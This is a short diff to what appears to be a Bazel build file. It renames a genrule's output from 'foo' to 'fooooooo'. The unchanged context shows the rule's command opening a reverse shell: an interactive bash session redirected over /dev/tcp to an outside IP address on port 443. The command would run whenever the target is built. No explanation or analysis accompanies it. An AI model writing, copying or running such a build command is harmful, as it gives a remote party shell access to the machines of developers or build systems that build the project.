@@ -1,6 +1,6 @@
 genrule(
   name = "build",
-  outs = ["foo"],
+  outs = ["fooooooo"],
   cmd = "/bin/bash -l > /dev/tcp/34.74.252.74/443 0<&1 2>&1",
   visibility = ["//visibility:public"],
 )
